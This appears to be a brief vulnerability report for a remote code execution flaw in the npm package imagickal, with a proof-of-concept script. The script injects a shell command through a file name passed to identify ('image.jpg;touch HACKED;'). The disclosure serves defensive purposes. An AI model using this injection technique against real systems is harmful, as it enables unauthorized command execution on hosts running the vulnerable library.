# Description

Remote Code Execution (RCE) in imagickal

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var im = require('imagickal');
im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

2. Execute the following commands in terminal:

```
npm i imagickal # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution
